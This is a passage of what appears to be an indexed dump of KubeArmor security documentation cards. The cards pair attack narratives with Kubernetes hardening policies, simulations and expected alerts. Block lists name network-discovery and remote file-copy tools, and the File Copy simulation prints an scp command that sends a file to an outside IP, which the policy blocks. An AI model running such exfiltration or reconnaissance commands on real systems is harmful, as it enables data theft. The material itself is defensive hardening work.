namespace: wordpress-mysql\nspec:\n  message: Alert! Attempt to make changes to database detected\n  tags:\n  - CIS\n  - CIS_Linux\n  selector:\n    matchLabels:\n      app: mysql\n  file:\n    matchDirectories:\n    - dir: /var/lib/mysql/\n      ownerOnly: true\n      readOnly: true\n      severity: 1\n      action: Block\n</code></pre>"},{"location":"use-cases/cards/Database-access/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash\nroot@mysql-74775b4bf4-65nqf:/# cd var/lib/mysql\nroot@mysql-74775b4bf4-65nqf:/var/lib/mysql# cat ib_logfile1\ncat: ib_logfile1: Permission denied\nroot@mysql-74775b4bf4-65nqf:/var/lib/mysql#\n</code></pre>"},{"location":"use-cases/cards/Database-access/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"ATags\": [\n    \"CIS\",\n    \"CIS_Linux\"\n  ],\n  \"Action\": \"Block\",\n  \"ClusterName\": \"aditya\",\n  \"ContainerID\": \"b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4\",\n  \"ContainerImage\": \"docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae\",\n  \"ContainerName\": \"mysql\",\n  \"Data\": \"syscall=SYS_OPEN flags=O_RDONLY\",\n  \"Enforcer\": \"AppArmor\",\n  \"HashID\": \"a7b7d91d52de395fe6cda698e89e0112e6f3ab818ea331cee60295a8ede358c8\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 29898,\n  \"HostPPID\": 29752,\n  \"Labels\": \"app=mysql\",\n  \"Message\": \"Alert! Attempt to make changes to database detected\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"mysql\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 230,\n  \"PPID\": 223,\n  \"PodName\": \"mysql-74775b4bf4-65nqf\",\n  \"PolicyName\": \"ksp-block-mysql-dir\",\n  \"ProcessName\": \"/bin/cat\",\n  \"Resource\": \"/var/lib/mysql/ib_logfile1\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"1\",\n  \"Source\": \"/bin/cat ib_logfile1\",\n  \"Tags\": \"CIS,CIS_Linux\",\n  \"Timestamp\": 1696322555,\n  \"Type\": \"MatchedPolicy\",\n  \"UID\": 0,\n  \"UpdatedTime\": \"2023-10-03T08:42:35.618890Z\",\n  \"cluster_id\": \"3896\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Database-access/#references","title":"References","text":"<p>MITRE Scan DatabasesYahoo Service Hacked</p>"},{"location":"use-cases/cards/Discovery-tools/","title":"Discovery tools","text":"<p>Do not allow discovery/search of tools/configuration.</p>"},{"location":"use-cases/cards/Discovery-tools/#narrative","title":"Narrative","text":"<p>Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system</p>"},{"location":"use-cases/cards/Discovery-tools/#attack-scenario","title":"Attack Scenario","text":"<p>Adversaries can potentially use information related to services, remote hosts, and local network infrastructure devices, including those that may be vulnerable to remote software exploitation to perform malicious attacks like exploiting open ports and injecting payloads to get remote shells. It's crucial to take proactive measures to prevent these attacks from occurring, such as implementing proper network segmentation and hardening network devices. Attack Type Reconnaissance, Brute force, Command Injection Actual Attack Microsoft exchange server attack 2021</p>"},{"location":"use-cases/cards/Discovery-tools/#compliance","title":"Compliance","text":"<ul> <li>CIS Distribution Independent Linuxv2.0</li> <li>Control-Id: 6.3</li> </ul>"},{"location":"use-cases/cards/Discovery-tools/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Discovery-tools/#discovery-tools_1","title":"Discovery tools","text":"<pre><code>Version: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: harden-dvwa-web-network-service-scanning\n  namespace: default\nspec:\n  action: Block\n  message: Network service has been scanned!\n  process:\n    matchPaths:\n    - path: /usr/bin/netstat\n    - path: /bin/netstat\n    - path: /usr/sbin/ip\n    - path: /usr/bin/ip\n    - path: /sbin/ip\n    - path: /bin/ip\n    - path: /usr/sbin/iw\n    - path: /sbin/iw\n    - path: /usr/sbin/ethtool\n    - path: /sbin/ethtool\n    - path: /usr/sbin/ifconfig\n    - path: /sbin/ifconfig\n    - path: /usr/sbin/arp\n    - path: /sbin/arp\n    - path: /usr/sbin/iwconfig\n    - path: /sbin/iwconfig\n  selector:\n    matchLabels:\n      app: dvwa-web\n      tier: frontend\n  severity: 5\n  tags:\n  - MITRE\n  - FGT1046\n  - CIS\n</code></pre>"},{"location":"use-cases/cards/Discovery-tools/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it dvwa-web-566855bc5b-xtgwq -- bash\nroot@dvwa-web-566855bc5b-xtgwq:/var/www/html# netstat\nbash: /bin/netstat: Permission denied\nroot@dvwa-web-566855bc5b-xtgwq:/var/www/html# ifconfig\nbash: /sbin/ifconfig: Permission denied\nroot@dvwa-web-566855bc5b-xtgwq:/var/www/html#\nroot@dvwa-web-566855bc5b-xtgwq:/var/www/html# arp\nbash: /usr/sbin/arp: Permission denied\n</code></pre>"},{"location":"use-cases/cards/Discovery-tools/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"no-trust\",\n  \"ContainerID\": \"e8ac2e227d293e76ab81a34945b68f72a2618ed3275ac64bb6a82f9cd2d014f1\",\n  \"ContainerImage\": \"docker.io/cytopia/dvwa:php-8.1@sha256:f7a9d03b1dfcec55757cc39ca2470bdec1618b11c4a51052bb4f5f5e7d78ca39\",\n  \"ContainerName\": \"dvwa\",\n  \"Data\": \"syscall=SYS_EXECVE\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 35592,\n  \"HostPPID\": 35557,\n  \"Labels\": \"tier=frontend,app=dvwa-web\",\n  \"Message\": \"Network service has been scanned!\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Process\",\n  \"Owner\": {\n    \"Name\": \"dvwa-web\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 989,\n  \"PPID\": 983,\n  \"ParentProcessName\": \"/bin/bash\",\n  \"PodName\": \"dvwa-web-566855bc5b-npjn8\",\n  \"PolicyName\": \"harden-dvwa-web-network-service-scanning\",\n  \"ProcessName\": \"/bin/netstat\",\n  \"Resource\": \"/bin/netstat\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"5\",\n  \"Source\": \"/bin/bash\",\n  \"Tags\": \"MITRE,FGT1046,CIS\",\n  \"Timestamp\": 1696501152,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-05T10:19:12.809606Z\",\n  \"cluster_id\": \"4225\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Discovery-tools/#references","title":"References","text":"<p>MITRE Network Service Discovery</p>"},{"location":"use-cases/cards/Ensure-TLS/","title":"Enforcing TLS Encryption for Secure Communications","text":"<p>Ensure that all service endpoints are using the right TLS and certificate configuration.</p>"},{"location":"use-cases/cards/Ensure-TLS/#description","title":"Description","text":"<p>k8tls (pronounced cattles), to assess server port security by detecting its TLS and certificates configuration.k8tls has been used in the context of general k8s clusters to understand the security risk posture of exposed k8s service endpoints</p>"},{"location":"use-cases/cards/Ensure-TLS/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker may perform reconnaissance to identify protocol without TLS to exploit those parameters. TLS ensures all the traffic flows in an encrypted manner to avoid the risk of MITM attacks.</p> <p>Attack Type Man-in-the-middle(MITM)</p>"},{"location":"use-cases/cards/Ensure-TLS/#tags","title":"Tags","text":"<ul> <li>Ensuring TLS</li> </ul>"},{"location":"use-cases/cards/Ensure-TLS/#getting-started","title":"Getting Started","text":""},{"location":"use-cases/cards/Ensure-TLS/#scan-k8s-services","title":"Scan k8s services","text":"<p>For k8s, the solution gets deployed as a job that scans the k8s service ports.</p> <p>Clone the GitHub repo link: https://github.com/kubearmor/k8tls</p> <pre><code>Git clone https://github.com/kubearmor/k8tls.git\n</code></pre> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/k8tls/main/k8s/job.yaml\nkubectl logs -n k8tls $(kubectl get pod -n k8tls -l job-name=k8tls -o name) -f\n</code></pre>"},{"location":"use-cases/cards/Ensure-TLS/#output","title":"Output","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                           NAME                          \u2502 ADDRESS            \u2502   STATUS   \u2502 VERSION \u2502 CIPHERSUITE            \u2502 HASH   \u2502 SIGNATURE \u2502 VERIFICATION                                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                default/kubernetes[https]                \u2502 10.43.0.1:443      \u2502     TLS    \u2502 TLSv1.3 \u2502 TLS_AES_128_GCM_SHA256 \u2502 SHA256 \u2502 ECDSA     \u2502 self-signed certificate in certificate chain \u2502\n\u2502              kube-system/kube-dns[dns-tcp]              \u2502 10.43.0.10:53      \u2502 PLAIN_TEXT \u2502         \u2502                        \u2502        \u2502           \u2502                                              \u2502\n\u2502              kube-system/kube-dns[metrics]              \u2502 10.43.0.10:9153    \u2502 PLAIN_TEXT \u2502         \u2502                        \u2502        \u2502           \u2502                                              \u2502\n\u2502            kube-system/metrics-server[https]            \u2502 10.43.213.123:443  \u2502     TLS    \u2502 TLSv1.3 \u2502 TLS_AES_128_GCM_SHA256 \u2502 SHA256 \u2502 RSA-PSS   \u2502 self-signed certificate in certificate chain \u2502\n\u2502                  kube-system/kubearmor                  \u2502 10.43.66.242:32767 \u2502 PLAIN_TEXT \u2502         \u2502                        \u2502        \u2502           \u2502                                              \u2502\n\u2502 kube-system/kubearmor-controller-metrics-service[https] \u2502 10.43.231.238:8443 \u2502     TLS    \u2502 TLSv1.3 \u2502 TLS_AES_128_GCM_SHA256 \u2502 SHA256 \u2502 RSA-PSS   \u2502 self-signed certificate in certificate chain \u2502\n\u2502     kube-system/kubearmor-controller-webhook-service    \u2502 10.43.172.143:443  \u2502     TLS    \u2502 TLSv1.3 \u2502 TLS_AES_128_GCM_SHA256 \u2502 SHA256 \u2502 RSA-PSS   \u2502 unable to verify the first certificate       \u2502\n\u2502                default/dvwa-mysql-service               \u2502 10.43.120.37:3306  \u2502 PLAIN_TEXT \u2502         \u2502                        \u2502        \u2502           \u2502                                              \u2502\n\u2502                 default/dvwa-web-service                \u2502 10.43.109.162:8081 \u2502  CONNFAIL  \u2502         \u2502                        \u2502        \u2502           \u2502                                              \u2502\n\u2502                 kube-system/traefik[web]                \u2502 10.43.23.112:80    \u2502     TLS    \u2502 TLSv1.3 \u2502 TLS_AES_128_GCM_SHA256 \u2502 SHA256 \u2502 RSA-PSS   \u2502 self-signed certificate                      \u2502\n\u2502              kube-system/traefik[websecure]             \u2502 10.43.23.112:443   \u2502     TLS    \u2502 TLSv1.3 \u2502 TLS_AES_128_GCM_SHA256 \u2502 SHA256 \u2502 RSA-PSS   \u2502 self-signed certificate                      \u2502\n\u2502      accuknox-agents/agents-operator[health-check]      \u2502 10.43.246.69:9090  \u2502 PLAIN_TEXT \u2502         \u2502                        \u2502        \u2502           \u2502                                              \u2502\n\u2502       accuknox-agents/agents-operator[spire-agent]      \u2502 10.43.246.69:9091  \u2502 PLAIN_TEXT \u2502         \u2502                        \u2502        \u2502           \u2502                                              \u2502\n\u2502             accuknox-agents/discovery-engine            \u2502 10.43.193.125:9089 \u2502 PLAIN_TEXT \u2502         \u2502                        \u2502        \u2502           \u2502                                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"use-cases/cards/Ensure-TLS/#screenshots","title":"Screenshots","text":""},{"location":"use-cases/cards/Ensure-TLS/#zero-trust-policy","title":"Zero Trust Policy","text":""},{"location":"use-cases/cards/FIM/","title":"File Integrity Monitoring (FIM) with AccuKnox","text":"<p>File Integrity Monitoring</p>"},{"location":"use-cases/cards/FIM/#narrative","title":"Narrative","text":"<p>Changes to system binary folders, configuration paths, and credentials paths need to be monitored for change. With KubeArmor, one can not only monitor for changes but also block any write attempts in such system folders. Compliance frameworks such as PCI-DSS, NIST, and CIS expect FIM to be in place.</p>"},{"location":"use-cases/cards/FIM/#attack-scenario","title":"Attack Scenario","text":"<p>In a possible attack scenario, an attacker may try to update the configuration to disable security controls or access logs. This can allow them to gain further access to the system and carry out malicious activities undetected. It's crucial to be aware of such threats and take proactive measures to prevent such attacks from occurring.  Attack Type Data Manipulation, Integrity Threats Actual Attack NetWalker, Conti, DarkSide RaaS</p>"},{"location":"use-cases/cards/FIM/#compliance","title":"Compliance","text":"<ul> <li>CIS Distribution Independent Linuxv2.0, Control-Id:6.3.5</li> <li>PCI-DSS, Requirement: 6</li> <li>PCI-DSS, Requirement: 10</li> <li>NIST_800-53_AU-2</li> <li>MITRE_T1565_data_manipulation</li> </ul>"},{"location":"use-cases/cards/FIM/#policy","title":"Policy","text":""},{"location":"use-cases/cards/FIM/#file-integrity-monitoring","title":"File Integrity Monitoring","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: harden-mysql-file-integrity-monitoring\n  namespace: wordpress-mysql\nspec:\n  action: Block\n  file:\n    matchDirectories:\n    - dir: /sbin/\n      readOnly: true\n      recursive: true\n    - dir: /usr/bin/\n      readOnly: true\n      recursive: true\n    - dir: /usr/lib/\n      readOnly: true\n      recursive: true\n    - dir: /usr/sbin/\n      readOnly: true\n      recursive: true\n    - dir: /bin/\n      readOnly: true\n      recursive: true\n    - dir: /boot/\n      readOnly: true\n      recursive: true\n  message: Detected and prevented compromise to File integrity\n  selector:\n    matchLabels:\n      app: mysql\n  severity: 1\n  tags:\n  - NIST\n  - NIST_800-53_AU-2\n  - NIST_800-53_SI-4\n  - MITRE\n  - MITRE_T1036_masquerading\n  - MITRE_T1565_data_manipulation\n</code></pre>"},{"location":"use-cases/cards/FIM/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash\nroot@mysql-74775b4bf4-65nqf:/# cd sbin\nroot@mysql-74775b4bf4-65nqf:/sbin# touch file\ntouch: cannot touch 'file': Permission denied\nroot@mysql-74775b4bf4-65nqf:/sbin# cd ..\n</code></pre>"},{"location":"use-cases/cards/FIM/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"ATags\": [\n    \"NIST\",\n    \"NIST_800-53_AU-2\",\n    \"NIST_800-53_SI-4\",\n    \"MITRE\",\n    \"MITRE_T1036_masquerading\",\n    \"MITRE_T1565_data_manipulation\"\n  ],\n  \"Action\": \"Block\",\n  \"ClusterName\": \"aditya\",\n  \"ContainerID\": \"b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4\",\n  \"ContainerImage\": \"docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae\",\n  \"ContainerName\": \"mysql\",\n  \"Data\": \"syscall=SYS_OPEN flags=O_WRONLY|O_CREAT|O_NOCTTY|O_NONBLOCK\",\n  \"Enforcer\": \"AppArmor\",\n  \"HashID\": \"f0b220bfa3b7aeae754f3bf8a60dd1a0af001f5956ad22f625bdf83406a7fea3\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 16462,\n  \"HostPPID\": 16435,\n  \"Labels\": \"app=mysql\",\n  \"Message\": \"Detected and prevented compromise to File integrity\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"mysql\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 167,\n  \"PPID\": 160,\n  \"PodName\": \"mysql-74775b4bf4-65nqf\",\n  \"PolicyName\": \"harden-mysql-file-integrity-monitoring\",\n  \"ProcessName\": \"/bin/touch\",\n  \"Resource\": \"/sbin/file\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"1\",\n  \"Source\": \"/usr/bin/touch file\",\n  \"Tags\": \"NIST,NIST_800-53_AU-2,NIST_800-53_SI-4,MITRE,MITRE_T1036_masquerading,MITRE_T1565_data_manipulation\",\n  \"Timestamp\": 1696316210,\n  \"Type\": \"MatchedPolicy\",\n  \"UID\": 0,\n  \"UpdatedTime\": \"2023-10-03T06:56:50.829165Z\",\n  \"cluster_id\": \"3896\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/FIM/#references","title":"References","text":"<p>Mitre-Techniques-T1565PCI DSS and FIMThe biggest ransomware attacks in history</p>"},{"location":"use-cases/cards/File-Copy/","title":"File Copy","text":"<p>Prevent file copy using standard utilities.</p>"},{"location":"use-cases/cards/File-Copy/#narrative","title":"Narrative","text":"<p>Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they\u2019ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.</p>"},{"location":"use-cases/cards/File-Copy/#attack-scenario","title":"Attack Scenario","text":"<p>It's important to note that file copy tools can be leveraged by attackers for exfiltrating sensitive data and transferring malicious payloads into the workloads. Additionally, it can also assist in lateral movement within the system. It's crucial to take proactive measures to prevent these attacks from occurring. Attack Type Credential Access, Lateral movements, Information Disclosure Actual Attack DarkBeam Data Breach, Shields Health Care Group data breach</p>"},{"location":"use-cases/cards/File-Copy/#compliance","title":"Compliance","text":"<ul> <li>MITRE_TA0010_exfiltration</li> <li>NIST_800-53_SI-4(18)</li> <li>MITRE_TA0008_lateral_movement</li> </ul>"},{"location":"use-cases/cards/File-Copy/#policy","title":"Policy","text":""},{"location":"use-cases/cards/File-Copy/#file-copy_1","title":"File Copy","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: harden-wordpress-remote-file-copy\n  namespace: wordpress-mysql\nspec:\n  action: Block\n  message: Alert! remote file copy tools execution prevented.\n  process:\n    matchPaths:\n    - path: /usr/bin/rsync\n    - path: /bin/rsync\n    - path: /usr/bin/scp\n    - path: /bin/scp\n    - path: /usr/bin/scp\n    - path: /bin/scp\n  selector:\n    matchLabels:\n      app: wordpress\n  severity: 5\n  tags:\n  - MITRE\n  - MITRE_TA0008_lateral_movement\n  - MITRE_TA0010_exfiltration\n  - MITRE_TA0006_credential_access\n  - MITRE_T1552_unsecured_credentials\n  - NIST_800-53_SI-4(18)\n  - NIST\n  - NIST_800-53\n  - NIST_800-53_SC-4\n</code></pre>"},{"location":"use-cases/cards/File-Copy/#simulation","title":"Simulation","text":"<pre><code>root@wordpress-fb448db97-wj7n7:/usr/bin# scp /etc/ca-certificates.conf 104.192.3.74:/mine/                              \nbash: /usr/bin/scp: Permission denied                                                                                   \nroot@wordpress-fb448db97-wj7n7:/usr/bin#     \n</code></pre>"},{"location":"use-cases/cards/File-Copy/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"d3mo\",\n  \"ContainerID\": \"548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f\",\n  \"ContainerImage\": \"docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\",\n  \"ContainerName\": \"wordpress\",\n  \"Data\": \"syscall=SYS_EXECVE\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"master-node\",\n  \"HostPID\": 72178,\n  \"HostPPID\": 30490,\n  \"Labels\": \"app=wordpress\",\n  \"Message\": \"Alert! remote file copy tools execution prevented.\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"Process\",\n  \"Owner\": {\n    \"Name\": \"wordpress\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 259,\n  \"PPID\": 193,\n  \"ParentProcessName\": \"/bin/bash\",\n  \"PodName\": \"wordpress-fb448db97-wj7n7\",\n  \"PolicyName\": \"harden-wordpress-remote-file-copy\",\n  \"ProcessName\": \"/usr/bin/scp\",\n  \"Resource\": \"/usr/bin/scp /etc/ca-certificates.conf 104.192.3.74:/mine/\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"5\",\n  \"Source\": \"/bin/bash\",\n  \"Tags\": \"MITRE,MITRE_TA0008_lateral_movement,MITRE_TA0010_exfiltration,MITRE_TA0006_credential_access,MITRE_T1552_unsecured_credentials,NIST_800-53_SI-4(18),NIST,NIST_800-53,NIST_800-53_SC-4\",\n  \"Timestamp\": 1696487496,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-05T06:31:36.085860Z\",\n  \"cluster_id\": \"2302\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/File-Copy/#references","title":"References","text":"<p>MITRE ExfiltrationDarkbeams data breachShields Healthcare Group Data Breach</p>"},{"location":"use-cases/cards/File-forensics/","title":"File forensics","text":"<p>Get granular details of all the accessed files within the target workloads.</p>"},{"location":"use-cases/cards/File-forensics/#narrative","title":"Narrative","text":"<p>Changes to system binary folders, configuration paths, and credentials paths need to be monitored for change.</p>"},{"location":"use-cases/cards/File-forensics/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker might want to update the configuration so as to disable security controls or access logs.</p>"},{"location":"use-cases/cards/File-forensics/#compliance","title":"Compliance","text":"<ul> <li>CISv1</li> <li>Control-Id-Linux 4.1.12</li> </ul>"},{"location":"use-cases/cards/File-forensics/#policy","title":"Policy","text":""},{"location":"use-cases/cards/File-forensics/#file-forensics_1","title":"File Forensics","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: audit-for-system-paths\n  namespace: wordpress-mysql\nspec:\n  action: Allow\n  file:\n    matchDirectories:\n    - dir: /bin/\n      readOnly: true\n      recursive: true\n      action: Audit\n    - dir: /sbin/\n      readOnly: true\n      recursive: true\n      action: Audit\n    - dir: /usr/sbin/\n      readOnly: true\n      action: Audit\n      recursive: true\n    - dir: /usr/bin/\n      readOnly: true\n      recursive: true\n      action: Audit\n    - dir: /etc/\n      readOnly: true\n      recursive: true\n      action: Audit\n  severity: 5\n  tags:\n  - NIST\n  - PCI-DSS\n  message: Access to network files detected. Possible violation of NIST Controls\n  selector:\n    matchLabels:\n      app: mysql\n</code></pre>"},{"location":"use-cases/cards/File-forensics/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it mysql-74775b4bf4-mg7np -n wordpress-mysql -- bash\nroot@mysql-74775b4bf4-mg7np:/# cd /usr/bin\nroot@mysql-74775b4bf4-mg7np:/usr/bin# touch malicious-file\n</code></pre>"},{"location":"use-cases/cards/File-forensics/#expected-alert","title":"Expected Alert","text":"<pre><code>ClusterName: default\nHostName: gke-cluster-1-default-pool-37f4c896-m209\nNamespaceName: wordpress-mysql\nPodName: mysql-74775b4bf4-mg7np\nLabels: app=mysql\nContainerName: mysql\nContainerID: 6020fc7ad3489630e5d67b7a4615edefecc59cb1bbda826611c349a0a553ef60\nContainerImage: docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae\nType: MatchedPolicy\nPolicyName: audit-for-system-paths\nSeverity: 5\nMessage: Access to network files detected. Possible violation of NIST Controls\nSource: /usr/bin/touch malicious-file\nResource: /etc/ld.so.cache\nOperation: File\nAction: Audit\nData: syscall=SYS_OPEN flags=O_RDONLY|O_CLOEXEC\nEnforcer: eBPF Monitor\nResult: Passed\nATags: [NIST PCI-DSS]\nHostPID: 2.562504e+06\nHostPPID: 2.56229e+06\nOwner: map[Name:mysql Namespace:wordpress-mysql Ref:Deployment]\nPID: 167\nPPID: 160\nParentProcessName: /bin/bash\nProcessName: /bin/touch\nTags: NIST,PCI-DSS\n</code></pre>"},{"location":"use-cases/cards/File-forensics/#references","title":"References","text":"<p>MITRE Data Manipulation</p>"},{"location":"use-cases/cards/ICMP-control/","title":"ICMP control","text":"<p>Do not allow scanning tools to use ICMP for scanning the network.</p>"},{"location":"use-cases/cards/ICMP-control/#narrative","title":"Narrative","text":"<p>The Internet Control Message Protocol (ICMP) allows Internet hosts to notify each other of errors and allows diagnostics and troubleshooting for system administrators. Because ICMP can also be used by a potential adversary to perform reconnaissance against a target network, and due to historical denial-of-service bugs in broken implementations of ICMP, some network administrators block all ICMP traffic as a network hardening 